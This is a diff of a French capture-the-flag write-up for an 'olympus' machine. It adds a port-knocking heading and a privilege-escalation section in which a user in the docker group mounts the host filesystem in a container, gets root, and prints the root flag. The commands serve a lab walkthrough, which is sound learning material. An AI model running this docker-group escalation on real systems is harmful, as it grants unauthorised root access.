@@ -133,6 +133,8 @@ Lors de la phase initiale d'énumération, j'avais essayé de faire un transfert
 
 Nous avons des informations en or dans les **records TXT**. 
 
+###### Port Knocking
+
 Durant notre scan nmap, nous avons vu que le port 22 était filtré. 
 On obtient maintenant les credentials d'un utilisateur nommé prometheus, ainsi que des numéros pour aller au portail d'Hadès qui sont concrètement les numéros de port sur lesquels nous devons nous connecter pour réaliser un **Port Knocking** afin de se connecter à l'utilisateur prometheus.
 
@@ -146,3 +148,24 @@ Ensuite nous pouvons nous connecter avec le mot de passe obtenu auparavant. 🤠
 
 ![port_knocking](https://i.imgur.com/tJ5fJMj.png)
 
+# Privilege Escalation
+
+Prometheus est dans le **groupe "docker"**.
+Docker exige des droits root donc je vais exécuter un shell à partir d'une image du Docker Hub:
+
+```bash
+prometheus@olympus:~$ docker run -it olympia bash
+root@f388364ddf48:/#
+```
+
+À noter que nous pouvons aussi monter la racine du système de fichiers local dans cette image comme le réfère [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell):
+
+```bash
+prometheus@olympus:~$ docker run -v /:/mnt --rm -it olympia chroot /mnt bash
+root@421e0ac051c7:/# cd /root && ls
+root.txt
+root@421e0ac051c7:~# cat *
+aba486990e2e849e25c23f6e41e5e303
+```
+
+Voila nous sommes enfin root ! 🙂
